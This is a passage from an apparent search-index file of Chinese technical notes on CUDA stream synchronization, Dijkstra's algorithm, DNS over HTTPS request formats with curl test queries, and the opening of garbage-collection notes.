\u200b\u5728\u200b\u521b\u5efa\u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u88ab\u200b\u7ed1\u5b9a\u200b\u5230\u200b\u521b\u5efa\u200b\u65f6\u200b\u7684\u200b\u5f53\u524d\u200b CUDA device\uff08<code>A host thread can set the device it operates on at any time by calling cudaSetDevice(). Device memory allocations and kernel launches are made on the currently set device; streams and events are created in association with the currently set device.</code>\uff09\u3002\u200b\u5982\u679c\u200b Launch kernel \u200b\u65f6\u200b\u6307\u5b9a\u200b\u7684\u200b stream \u200b\u4e0d\u200b\u5c5e\u4e8e\u200b\u5f53\u524d\u200b CUDA device\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5931\u8d25\u200b\uff08<code>A kernel launch will fail if it is issued to a stream that is not associated to the current device</code>\uff09\uff0c\u200b\u800c\u200b memcpy \u200b\u6ca1\u6709\u200b\u8fd9\u4e2a\u200b\u9650\u5236\u200b\uff08<code>A memory copy will succeed even if it is issued to a stream that is not associated to the current device.</code>\uff09\u3002</p> <p>\u200b\u5982\u679c\u200b\u5f02\u6b65\u200b\u4efb\u52a1\u200b\u5728\u200b\u542f\u52a8\u200b\u65f6\u200b\uff0c\u200b\u6ca1\u6709\u200b\u6307\u5b9a\u200b stream\uff08<code>Kernel launches and host &lt;-&gt; device memory copies that do not specify any stream parameter</code>\uff09\uff0c\u200b\u6216\u8005\u200b\u6307\u5b9a\u200b\u4e86\u200b stream \u200b\u7b49\u4e8e\u200b 0\uff08<code>or equivalently that set the stream parameter to zero</code>\uff09\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u4f1a\u200b\u52a0\u5165\u200b\u5230\u200b default stream \u200b\u4e2d\u200b\u3002\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cdefault stream \u200b\u662f\u200b\u4e00\u4e2a\u200b\u7279\u6b8a\u200b\u7684\u200b NULL stream\uff0c\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u6709\u200b\u4e00\u4e2a\u200b\u552f\u4e00\u200b\u7684\u200b NULL stream\uff0c\u200b\u5b83\u200b\u7684\u200b\u89c4\u5219\u200b\u662f\u200b\u7279\u6b8a\u200b\u7684\u200b\uff08<code>the default stream is a special stream called the NULL stream and each device has a single NULL stream used for all host threads.</code>\uff09\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6240\u8c13\u200b\u7684\u200b Implicit Synchronization\uff08<code>The NULL stream is special as it causes implicit synchronization as described in Implicit Synchronization.</code>\uff09\u3002\u200b\u540e\u9762\u200b\u4f1a\u8ba8\u200b Explicit Synchronization \u200b\u548c\u200b Implicit Synchronization\u3002</p> <p>\u200b\u5982\u679c\u200b\u7f16\u8bd1\u200b\u65f6\u200b\u4f20\u9012\u200b\u4e86\u200b <code>--default-stream per-thread</code> \u200b\u53c2\u6570\u200b\uff0c\u200b\u90a3\u4e48\u200b default stream \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u666e\u901a\u200b\u7684\u200b stream\uff0c\u200b\u5e76\u4e14\u200b\u6bcf\u4e2a\u200b Host thread \u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b default stream\uff08<code>For code that is compiled using the --default-stream per-thread compilation flag (or that defines the CUDA_API_PER_THREAD_DEFAULT_STREAM macro before including CUDA headers (cuda.h and cuda_runtime.h)), the default stream is a regular stream and each host thread has its own default stream.</code>\uff09\u3002</p> <p>\u200b\u867d\u7136\u200b stream \u200b\u4e4b\u95f4\u200b\u4e0d\u200b\u4fdd\u8bc1\u200b\u987a\u5e8f\u200b\uff0c\u200b\u4f46\u200b\u6709\u65f6\u5019\u200b\uff0c\u200b\u53c8\u200b\u5e0c\u671b\u200b\u5728\u200b stream \u200b\u4e4b\u95f4\u200b\u5efa\u7acb\u200b\u4e00\u4e2a\u200b\u4e34\u65f6\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\u3002\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u7528\u200b event \u200b\u6765\u200b\u5b9e\u73b0\u200b\uff1a\u200b\u9996\u5148\u200b\u7528\u200b <code>cudaEventRecord</code> \u200b\u51fd\u6570\u200b\uff0c\u200b\u628a\u200b\u4e00\u4e2a\u200b stream \u200b\u4e0a\u200b\u7684\u200b\u4efb\u52a1\u200b\u8bb0\u5f55\u4e0b\u6765\u200b\uff08<code>Captures in event the contents of stream at the time of this call. event and stream must be on the same CUDA context. Calls such as cudaEventQuery() or cudaStreamWaitEvent() will then examine or wait for completion of the work that was captured</code>\uff09\uff0c\u200b\u4e4b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>cudaStreamWaitEvent</code> \u200b\u51fd\u6570\u200b\u5728\u200b\u53e6\u200b\u4e00\u4e2a\u200b stream \u200b\u4e0a\u200b\u7b49\u5f85\u200b event \u200b\u8bb0\u5f55\u4e0b\u6765\u200b\u7684\u200b\u4efb\u52a1\u200b\u5b8c\u6210\u200b\uff08<code>cudaStreamWaitEvent() takes a stream and an event as parameters (see Events for a description of events) and makes all the commands added to the given stream after the call to cudaStreamWaitEvent() delay their execution until the given event has completed.</code>\uff09\u3002</p>"},{"location":"software/cuda.html#implicitexplicit-synchronization","title":"Implicit/Explicit Synchronization","text":"<p>Stream \u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u4efb\u52a1\u200b\u5728\u200b GPU \u200b\u4e0a\u200b\u6267\u884c\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u4f46\u662f\u200b\u5b83\u4eec\u200b\u548c\u200b Host \u200b\u4ee3\u7801\u200b\u4f9d\u7136\u200b\u662f\u200b\u5f02\u6b65\u200b\u7684\u200b\u3002\u200b\u4e3a\u4e86\u200b\u8ba9\u200b Host \u200b\u4ee3\u7801\u200b\u53ef\u4ee5\u200b\u7b49\u5f85\u200b GPU \u200b\u4e0a\u200b\u7684\u200b\u4efb\u52a1\u200b\u5b8c\u6210\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>cudaDeviceSynchronize</code> \u200b\u7b49\u5f85\u200b\u6240\u6709\u200b stream \u200b\u4e0a\u200b\u7684\u200b\u4efb\u52a1\u200b\u5b8c\u6210\u200b\uff08<code>cudaDeviceSynchronize() waits until all preceding commands in all streams of all host threads have completed.</code>\uff09\uff0c\u200b\u6216\u8005\u200b\u7528\u200b <code>cudaStreamSynchronize</code> \u200b\u6765\u200b\u7b49\u5f85\u200b\u5177\u4f53\u200b\u67d0\u4e2a\u200b stream \u200b\u4e0a\u200b\u7684\u200b\u4efb\u52a1\u200b\u5b8c\u6210\u200b\uff08<code>cudaStreamSynchronize()takes a stream as a parameter and waits until all preceding commands in the given stream have completed. It can be used to synchronize the host with a specific stream, allowing other streams to continue executing on the device.</code>\uff09\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u8fc7\u200b\u7684\u200b <code>cudaStreamWaitEvent</code> \u200b\u51fd\u6570\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u5728\u200b\u591a\u4e2a\u200b stream \u200b\u4e4b\u95f4\u200b\u505a\u200b\u540c\u6b65\u200b\uff08<code>cudaStreamWaitEvent() takes a stream and an event as parameters (see Events for a description of events) and makes all the commands added to the given stream after the call to cudaStreamWaitEvent() delay their execution until the given event has completed.</code>\uff09\u3002\u200b\u4e0a\u8ff0\u200b\u540c\u6b65\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u90fd\u200b\u9700\u8981\u200b\u5728\u200b Host \u200b\u4e0a\u200b\u6267\u884c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u51fd\u6570\u200b\uff0c\u200b\u56e0\u6b64\u200b\u662f\u200b Explicit Synchronization\u3002</p> <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u540c\u6b65\u200b\u65b9\u6cd5\u200b\u662f\u200b Implicit Synchronization\uff1a\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u88ab\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u540c\u6b65\u200b\u70b9\u200b\uff0c\u200b\u5728\u200b\u540c\u6b65\u200b\u70b9\u200b\u4e4b\u524d\u200b\u7684\u200b\u4efb\u52a1\u200b\u4e0d\u4f1a\u200b\u548c\u200b\u540c\u6b65\u200b\u70b9\u200b\u4e4b\u540e\u200b\u7684\u200b\u4efb\u52a1\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\uff08<code>Two commands from different streams cannot run concurrently if any one of the following operations is issued in-between them by the host thread:</code>\uff09\uff1a</p> <ul> <li>Host page-locked \u200b\u5185\u5b58\u200b\u5206\u914d\u200b\uff08<code>a page-locked host memory allocation</code>\uff09</li> <li>Device \u200b\u5185\u5b58\u200b\u5206\u914d\u200b\uff08<code>a device memory allocation</code>\uff09</li> <li>Device \u200b\u5185\u5b58\u200b memset\uff08<code>a device memory set</code>\uff09</li> <li>\u200b\u540c\u4e00\u4e2a\u200b Device \u200b\u5185\u5b58\u200b\u4e0a\u200b\u7684\u200b memcpy\uff08<code>a memory copy between two addresses to the same device memory</code>\uff09</li> <li>\u200b\u53d1\u9001\u5230\u200b NULL stream \u200b\u7684\u200b CUDA \u200b\u547d\u4ee4\u200b\uff08<code>any CUDA command to the NULL stream</code>\uff09</li> <li>\u200b\u4fee\u6539\u200b L1 \u200b\u548c\u200b Shared memory \u200b\u5927\u5c0f\u200b\u7684\u200b\u914d\u7f6e\u200b\uff08<code>a switch between the L1/shared memory configurations described in Compute Capability 7.x</code>\uff09</li> </ul> <p>Implicit Synchronization \u200b\u7528\u200b\u5728\u200b NULL stream \u200b\u4e0a\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0d\u200b\u8bbe\u7f6e\u200b per-thread \u200b\u53c2\u6570\u200b\u65f6\u200b\u7684\u200b default stream\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b cudaStreamLegacy\u3002\u200b\u6211\u200b\u7406\u89e3\u200b\u8fd9\u4e2a\u200b\u662f\u200b\u4e3a\u4e86\u200b\u7167\u987e\u200b\u65e7\u200b CUDA \u200b\u4ee3\u7801\u200b\u800c\u200b\u4fdd\u7559\u200b\u7684\u200b\u8bbe\u5b9a\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u505a\u200b\u4e86\u200b\u5f88\u591a\u200b\u540c\u6b65\u200b\u7684\u200b\u4fdd\u8bc1\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u5f02\u6b65\u200b\u7684\u200b\u7a0b\u5ea6\u200b\u6bd4\u8f83\u200b\u4f4e\u200b\uff0c\u200b\u6240\u4ee5\u200b\u65e7\u200b\u7684\u200b CUDA \u200b\u4ee3\u7801\u200b\u53ef\u80fd\u200b\u5047\u8bbe\u200b\u4e86\u200b\u8fd9\u4e9b\u200b\u4fdd\u8bc1\u200b\uff0c\u200b\u800c\u200b\u6ca1\u6709\u200b\u63d2\u5165\u200b\u663e\u5f0f\u200b\u7684\u200b\u540c\u6b65\u200b\u8c03\u7528\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b Stream synchronization behavior\uff0c\u200b\u5b83\u4f1a\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u9690\u5f0f\u200b\u7684\u200b\u5168\u5c40\u200b Barrier\uff1a\u200b\u5728\u200b NULL(legacy) stream \u200b\u4e0a\u200b\u63d0\u4ea4\u200b\u4efb\u52a1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u9996\u5148\u200b\u7b49\u5f85\u200b\u6240\u6709\u200b\u7684\u200b blocking stream\uff0c\u200b\u7136\u540e\u200b\u63d0\u4ea4\u200b\u81ea\u5df1\u200b\u8fd9\u4e2a\u200b\u4efb\u52a1\u200b\uff0c\u200b\u7136\u540e\u200b\u6240\u6709\u200b\u7684\u200b blocking stream \u200b\u518d\u200b\u7b49\u5f85\u200b legacy stream \u200b\u4e0a\u200b\u7684\u200b\u4efb\u52a1\u200b\uff08<code>The legacy default stream is an implicit stream which synchronizes with all other streams in the same CUcontext except for non-blocking streams, described below. (For applications using the runtime APIs only, there will be one context per device.) When an action is taken in the legacy stream such as a kernel launch or cudaStreamWaitEvent(), the legacy stream first waits on all blocking streams, the action is queued in the legacy stream, and then all blocking streams wait on the legacy stream.</code>\uff09\u3002blocking stream \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5728\u200b stream \u200b\u521b\u5efa\u200b\u65f6\u200b\uff0c\u200b\u6ca1\u6709\u200b\u6307\u5b9a\u200b cudaStreamNonBlocking \u200b\u53c2\u6570\u200b\u7684\u200b stream\uff08<code>Non-blocking streams which do not synchronize with the legacy stream can be created using the cudaStreamNonBlocking flag with the stream creation APIs.</code>\uff09\u3002\u200b\u9875\u9762\u200b\u4e0a\u200b\u7ed9\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>k_1&lt;&lt;&lt;1, 1, 0, s&gt;&gt;&gt;();\nk_2&lt;&lt;&lt;1, 1&gt;&gt;&gt;();\nk_3&lt;&lt;&lt;1, 1, 0, s&gt;&gt;&gt;();\n</code></pre> <p><code>k_2</code> \u200b\u5728\u200b NULL(legacy) stream \u200b\u4e0a\u200b\u63d0\u4ea4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4f1a\u200b\u7b49\u5f85\u200b <code>k_1</code> \u200b\u5b8c\u6210\u200b\uff0c\u200b\u800c\u200b\u5176\u540e\u200b\u7684\u200b <code>k_3</code> \u200b\u53c8\u200b\u4f1a\u200b\u7b49\u200b <code>k_2</code> \u200b\u5b8c\u6210\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u200b\u5176\u5b9e\u200b\u90fd\u200b\u662f\u200b\u5728\u200b\u6253\u8865\u4e01\u200b\uff1a\u200b\u73b0\u6210\u200b\u4ee3\u7801\u200b\u4e0d\u80fd\u200b\u7834\u574f\u200b\uff0c\u200b\u600e\u4e48\u529e\u200b\uff1f\u200b\u9ed8\u8ba4\u200b\u7528\u200b legacy stream \u200b\u673a\u5236\u200b\uff0c\u200b\u4e0d\u5f97\u4e0d\u200b\u56db\u5904\u200b\u540c\u6b65\u200b\uff0c\u200b\u5982\u679c\u200b\u7a0b\u5e8f\u200b\u8981\u200b\u60f3\u8981\u200b\u9003\u79bb\u200b\u8fd9\u4e2a\u200b\u56f0\u5883\u200b\uff0c\u200b\u5c31\u200b\u5f97\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b nonblocking \u200b\u7684\u200b stream\u3002\u200b\u5bf9\u4e8e\u200b\u65b0\u200b\u4ee3\u7801\u200b\uff0c\u200b\u8981\u4e48\u200b\u6253\u5f00\u200b per thread \u200b\u53c2\u6570\u200b\uff0c\u200b\u628a\u200b\u9ed8\u8ba4\u200b thread \u200b\u90fd\u200b\u6362\u6210\u200b\u6b63\u5e38\u200b\u7684\u200b stream\uff1b\u200b\u8981\u4e48\u200b\u6bcf\u6b21\u200b launch \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u90fd\u200b\u663e\u5f0f\u200b\u6307\u5b9a\u200b\u4e00\u4e2a\u200b stream\u3002</p>"},{"location":"software/cuda.html#stream-ordered-memory-allocator","title":"Stream Ordered Memory Allocator","text":"<p>\u200b\u89e3\u51b3\u200b NULL(legacy) stream \u200b\u7684\u200b\u5386\u53f2\u200b\u9057\u7559\u95ee\u9898\u200b\u4ee5\u540e\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u6210\u4e3a\u200b\u540c\u6b65\u200b\u70b9\u200b\uff1a\u200b\u5185\u5b58\u200b\u5206\u914d\u200b\uff0c\u200b\u5185\u5b58\u200b\u5206\u914d\u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u540c\u6b65\u200b\u6240\u6709\u200b\u7684\u200b CUDA stream\uff08<code>Managing memory allocations using cudaMalloc and cudaFree causes GPU to synchronize across all executing CUDA streams.</code>\uff09\u3002\u200b\u4e8e\u662f\u200b\u65b0\u200b\u7684\u200b CUDA \u200b\u4e5f\u200b\u7ed9\u200b\u5185\u5b58\u200b\u5206\u914d\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u5f02\u6b65\u200b\u7248\u672c\u200b\uff0c\u200b\u548c\u200b Stream \u200b\u7ed1\u5b9a\u200b\u5728\u200b\u4e00\u8d77\u200b\uff1a<code>cudaMallocAsync</code> \u200b\u548c\u200b <code>cudaFreeAsync</code> \u200b\u51fd\u6570\u200b\u3002\u200b\u5177\u4f53\u200b\u4f7f\u7528\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u89c1\u200b API Fundamentals (cudaMallocAsync and cudaFreeAsync)\u3002</p>"},{"location":"software/dijkstra.html","title":"Dijkstra \u200b\u7b97\u6cd5","text":"<p>Dijkstra \u200b\u89e3\u51b3\u200b\u7684\u200b\u662f\u200b\u56fe\u200b\u4e0a\u200b\u7684\u200b\u5355\u6e90\u200b\u6700\u200b\u77ed\u200b\u8def\u5f84\u200b\u95ee\u9898\u200b\uff08Single Source Shortest Path\uff0cSSSP\uff09\u3002</p> <p>\u200b\u5b9e\u73b0\u200b\u5927\u81f4\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>def dijkstra(graph, source):\n    Q = priority_queue()\n\n    # initialize dist and Q\n    dist[source] = 0\n    for v in graph.vertices:\n        if v != source:\n            dist[v] = INF\n\n        Q.add_with_priority(v, dist[v])\n\n    while not Q.empty:\n        # find min dist and relax edge\n        u = Q.extract_min()\n\n        for v in u.neighbors():\n            # relax\n            new_dist = dist[u] + u.dist_to(v)\n            if new_dist &lt; dist[v]:\n                dist[v] = new_dist\n                Q.decrease_priority(v, new_dist)\n</code></pre> <p>Q \u200b\u662f\u200b\u4e00\u4e2a\u200b\u4f18\u5148\u200b\u961f\u5217\u200b\uff0c\u200b\u961f\u5217\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u90fd\u200b\u6709\u200b\u4f18\u5148\u7ea7\u200b\uff0c\u200b\u652f\u6301\u200b\u5982\u4e0b\u200b\u64cd\u4f5c\u200b\uff1a</p> <ol> <li><code>add_with_priority(element, priority)</code>\uff1a\u200b\u63d2\u5165\u200b\u65b0\u5143\u7d20\u200b</li> <li><code>empty()</code>\uff1a\u200b\u5224\u65ad\u200b\u961f\u5217\u200b\u662f\u5426\u200b\u4e3a\u7a7a\u200b</li> <li><code>extract_min()</code>\uff1a\u200b\u4ece\u200b\u961f\u5217\u200b\u4e2d\u200b\u5220\u9664\u200b\u4f18\u5148\u7ea7\u200b\u6700\u4f4e\u200b\u7684\u200b\u5143\u7d20\u200b\u5e76\u200b\u8fd4\u56de\u200b\u8be5\u200b\u5143\u7d20\u200b</li> <li><code>decrease_priority()</code>\uff1a\u200b\u4fee\u6539\u200b\u961f\u5217\u200b\u4e2d\u200b\u7279\u5b9a\u200b\u5143\u7d20\u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u961f\u5217\u200b\u4e2d\u200b\u6ca1\u6709\u200b\u91cd\u590d\u200b\u5143\u7d20\u200b</li> </ol> <p>\u200b\u7b97\u6cd5\u200b\u7684\u200b\u65f6\u95f4\u200b\u590d\u6742\u5ea6\u200b\u662f\u200b \\(O(|E|T_{dp}+|V|T_{em})\\)\uff0c\u200b\u5176\u4e2d\u200b \\(E\\) \u200b\u662f\u200b\u8fb9\u200b\u7684\u200b\u96c6\u5408\u200b\uff0c\\(V\\) \u200b\u662f\u200b\u9876\u70b9\u200b\u7684\u200b\u96c6\u5408\u200b\uff0c\\(T_{dp}\\) \u200b\u662f\u200b <code>decrease_priority()</code> \u200b\u7684\u200b\u65f6\u95f4\u200b\u590d\u6742\u5ea6\u200b\uff0c\\(T_{em}\\) \u200b\u662f\u200b <code>extract_min()</code> \u200b\u7684\u200b\u65f6\u95f4\u200b\u590d\u6742\u5ea6\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b\u4f18\u5148\u200b\u961f\u5217\u200b\u7684\u200b\u4e0d\u540c\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b\u65f6\u95f4\u200b\u590d\u6742\u5ea6\u200b\uff1a</p> <ol> <li>\u200b\u7528\u200b\u6570\u7ec4\u200b\u5b9e\u73b0\u200b\u4f18\u5148\u200b\u961f\u5217\u200b\uff0c\u200b\u5219\u200b \\(T_{dp}=O(1), T_{em}=O(|V|)\\)\uff0c\u200b\u56e0\u6b64\u200b\u65f6\u95f4\u200b\u590d\u6742\u5ea6\u200b\u662f\u200b \\(O(|E|+|V|^2)=O(|V|^2)\\)</li> <li>\u200b\u7528\u200b\u5e73\u8861\u200b\u6811\u200b\u6216\u8005\u200b\u5806\u200b\uff08\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u8bb0\u5f55\u200b\u6bcf\u4e2a\u200b\u9876\u70b9\u200b\u5728\u200b\u5806\u200b\u4e2d\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u968f\u7740\u200b\u5806\u200b\u7684\u200b\u66f4\u65b0\u200b\u800c\u200b\u66f4\u65b0\u200b\uff09\u200b\u5b9e\u73b0\u200b\u4f18\u5148\u200b\u961f\u5217\u200b\uff0c\u200b\u5219\u200b \\(T_{dp}=O(\\log{|V|}), T_{em}=O(\\log{|V|})\\)\uff0c\u200b\u7b97\u6cd5\u200b\u603b\u200b\u65f6\u95f4\u200b\u590d\u6742\u5ea6\u200b\u4e3a\u200b \\(O((|E|+|V|)\\log{|V|})\\)</li> <li>\u200b\u7528\u200b Fibonacci \u200b\u5806\u200b\u5b9e\u73b0\u200b\u4f18\u5148\u200b\u961f\u5217\u200b\uff0c\u200b\u5219\u200b \\(T_{dp}=O(1), T_{em}=O(\\log{|V|})\\)\uff0c\u200b\u7b97\u6cd5\u200b\u603b\u200b\u65f6\u95f4\u200b\u590d\u6742\u5ea6\u200b\u4e3a\u200b \\(O(|E|+|V|\\log{|V|})\\)</li> </ol> <p>\u200b\u6700\u8fd1\u200b\u4e00\u7bc7\u200b\u8bba\u6587\u200b A Randomized Algorithm for Single-Source Shortest Path on Undirected Real-Weighted Graphs \u200b\u63d0\u51fa\u200b\u4e86\u200b \\(O(|E|\\sqrt{\\log{|V|}\\log{\\log{|V|}}})\\) \u200b\u7684\u200b Dijkstra \u200b\u53d8\u79cd\u200b\u7b97\u6cd5\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\u4e86\u200b Wikipedia\u3002</p>"},{"location":"software/doh.html","title":"DNS over HTTPS (DoH)","text":"<p>\u200b\u6807\u51c6\u200b\uff1aRFC 8484</p> <p>\u200b\u8bf7\u6c42\u200b\u683c\u5f0f\u200b\uff1a</p> <ol> <li> <p>DNS \u200b\u683c\u5f0f\u200b GET \u200b\u7248\u200b\uff0c\u200b\u628a\u200b DNS \u200b\u7684\u200b\u8bf7\u6c42\u200b\u8fdb\u884c\u200b base64url \u200b\u7f16\u7801\u200b\u4f5c\u4e3a\u200b dns \u200b\u53c2\u6570\u200b\u4f20\u5165\u200b\uff0c\u200b\u5e76\u200b\u8bbe\u7f6e\u200b <code>accept: application/dns-message</code>\uff1a</p> <pre><code>:method = GET\n:scheme = https\n:authority = dnsserver.example.net\n:path = /dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB\naccept = application/dns-message\n</code></pre> </li> <li> <p>DNS \u200b\u683c\u5f0f\u200b POST \u200b\u7248\u200b\uff0c\u200b\u628a\u200b DNS \u200b\u7684\u200b\u8bf7\u6c42\u200b\u4f5c\u4e3a\u200b Payload \u200b\u4f20\u5165\u200b\uff0c\u200b\u8bbe\u7f6e\u200b <code>accept: application/dns-message</code> \u200b\u548c\u200b <code>content-type: application/dns-message</code>\uff1a</p> <pre><code>:method = POST\n:scheme = https\n:authority = dnsserver.example.net\n:path = /dns-query\naccept = application/dns-message\ncontent-type = application/dns-message\ncontent-length = 33\n\n&lt;33 bytes represented by the following hex encoding&gt;\n00 00 01 00 00 01 00 00  00 00 00 00 03 77 77 77\n07 65 78 61 6d 70 6c 65  03 63 6f 6d 00 00 01 00\n01\n</code></pre> </li> <li> <p>\u200b\u6b64\u5916\u200b\u90e8\u5206\u200b DoH \u200b\u670d\u52a1\u5668\u200b\u8fd8\u200b\u652f\u6301\u200b RFC 8484 \u200b\u4ee5\u5916\u200b\u7684\u200b JSON \u200b\u683c\u5f0f\u200b\uff1a</p> <pre><code>:method = GET\n:scheme = https\n:authority = dnsserver.example.net\n:path = /dns-query?name=baidu.com&amp;type=A\naccept = application/dns-json\n</code></pre> </li> </ol> <p>\u200b\u6d4b\u8bd5\u65b9\u6cd5\u200b\uff1a</p> <ul> <li>RFC 8484: <code>curl -H 'accept: application/dns-message' 'https://SERVER/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB' | hexdump -c</code></li> <li>JSON API: <code>curl -H 'accept: application/dns-json' 'https://SERVER/dns-query?name=baidu.com&amp;type=A'</code></li> </ul> <p>\u200b\u516c\u5f00\u200b\u7684\u200b DoH \u200b\u670d\u52a1\u200b\uff1a</p> <ul> <li>Google Public DNS:<ul> <li>https://dns.google/dns-query \u2013 RFC 8484 (GET and POST)</li> <li>https://dns.google/resolve? \u2013 JSON API (GET)</li> <li>\u200b\u5b9e\u6d4b\u200b\u4e24\u4e2a\u200b endpoint \u200b\u90fd\u200b\u652f\u6301\u200b RFC 8484 \u200b\u548c\u200b JSON API</li> </ul> </li> <li>Cloudflare 1.1.1.1:<ul> <li>https://cloudflare-dns.com/dns-query - RFC 8484 and JSON API</li> </ul> </li> <li>DNSPod:<ul> <li>https://doh.pub/dns-query - RFC 8484 and JSON API</li> </ul> </li> <li>Alibaba Cloud Public DNS<ul> <li>https://223.5.5.5/dns-query - RFC 8484\uff0c\u200b\u4e0d\u200b\u652f\u6301\u200b JSON API</li> </ul> </li> </ul>"},{"location":"software/gc.html","title":"\u5783\u573e\u200b\u56de\u6536\u200b Garbage Collection","text":"<p>\u200b\u672c\u6587\u200b\u662f\u200b\u5bf9\u200b The Garbage Collection Handbook - The art of automatic memory management \u200b\u4e00\u4e66\u200b\u7684\u200b\u5b66\u4e60\u200b\u7b14\u8bb0\u200b\u3002</p>"},{"location":"software/gc.html#_1","title":"\u57fa\u672c\u6982\u5ff5","text":"<ul> <li>mutator: \u200b\u6307\u200b\u7528\u6237\u7a0b\u5e8f\u200b\uff0c\u200b\u56e0\u200b\u4fee\u6539\u200b GC \u200b\u72b6\u6001\u200b\u800c\u200b\u5f97\u540d\u200b</li> <li>collector\uff1a\u200b\u6307\u200b\u5783\u573e\u200b\u56de\u6536\u200b\u7a0b\u5e8f\u200b</li> <li>mark-sweep\uff1amark \u200b\u9636\u6bb5\u200b\u6807\u8bb0\u200b\u6240\u6709\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0csweep \u200b\u9636\u6bb5\u200b\u56de\u6536\u200b\u4e0d\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b</li> <li>mark-compact\uff1amark \u200b\u9636\u6bb5\u200b\u6807\u8bb0\u200b\u6240\u6709\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0ccompact \u200b\u9636\u6bb5\u200b\u4e22\u5f03\u200b\u4e0d\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u628a\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b\u653e\u5728\u200b\u8fde\u7eed\u200b\u7684\u200b\u5185\u5b58\u200b</li> <li>copying collection\uff1a\u200b\u628a\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b\u590d\u5236\u5230\u200b\u65b0\u200b\u7684\u200b\u5806\u200b\uff0c\u200b\u7136\u540e\u200b\u56de\u6536\u200b\u65e7\u200b\u7684\u200b\u5806\u200b</li> <li>reference counting\uff1a\u200b\u5f15\u7528\u200b\u8ba1\u6570\u200b\uff0c\u200b\u8ba1\u6570\u200b\u964d\u5230\u200b 0 \u200b\u7684\u200b\u65f6\u5019\u200b\u91ca\u653e\u200b</li> <li>stop the world\uff1a\u200b\u628a\u200b mutator \u200b\u90fd\u200b\u505c\u4e0b\u6765\u200b\u4ee5\u540e\u200b\uff0c\u200b\u542f\u52a8\u200b\u5783\u573e\u200b\u56de\u6536\u200b\uff0c\u200b\u56de\u6536\u200b\u5b8c\u6210\u200b\u518d\u200b\u7ee7\u7eed\u200b mutator \u200b\u7684\u200b\u6267\u884c\u200b</li> <li>GC root: 